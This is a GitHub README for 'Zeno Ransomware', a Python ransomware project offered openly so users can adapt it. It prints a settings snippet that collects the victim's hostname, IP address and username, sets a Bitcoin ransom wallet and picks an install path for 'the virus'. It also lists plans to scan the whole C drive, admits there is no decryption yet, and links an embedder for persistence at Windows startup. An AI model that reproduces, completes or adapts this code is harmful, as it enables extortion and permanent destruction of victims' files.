![alt text](https://github.com/Zurek0x/zeno_Hijacker/blob/main/media/Screenshot_1.png?raw=true)
# Zeno Ransomware / Ransomware Written in Python
This is a simple ransomware source written in Python, With file encryption
and file decryption, Along with a lot of usability and comfort and ability to adapt
the code to your liking.

# Notice Errors
> * **To do:**
> * **Scan All Directories in C Drive**
> * **Scan Specific Directories in C Drive**
> * **Add Priority Directories in C Drive**

# Fix
> * **Add Decryption Methods, NONE AT THE MOMENT**

# Usage (Pieces of code, Look in Source)
![alt text](https://github.com/Zurek0x/zeno_RansomWare/blob/main/media/drg.png?raw=true)
```python
# =?/Settings/?= #
hostname=socket.gethostname()    # Get Hostname
IPAddr=socket.gethostbyname(hostname)   # Get IP

root = tk.Tk()
canvas = Canvas()
screensize = [f'{GetSystemMetrics(0)}', f'{GetSystemMetrics(1)}'] # Get resolution of monitor (1920x1080)
btc_wallet=str("bc1qgvsjxmw0t6jcezdxjg7n4yu08t5skm2f36zemt") # Bitcoin Addr to show on Msg
auto_decrypt = int(0) # Developer Stuff

user = os.getlogin() # Get Username of PC Directory (users)
cache_path=str(f"C:\\Users\\{user}\\Documents\\230") # Path to install the virus too ( MUST HAVE \\ not \ )
cache_name=str(f"encrypted.txt") # Cache file name to read and write too
cache_mem=[] # !DO NOT TOUCH THIS!
```
**You may want to change this depending on what your code does, Keep in mind of permission issues**
**handles read and write of file in class function.**
# Starting up with windows and extra stuff
To use these features you must import the code into zeno_Embedder which is a tool to do exactly this -> https://github.com/Zurek0x/zeno_Embedder
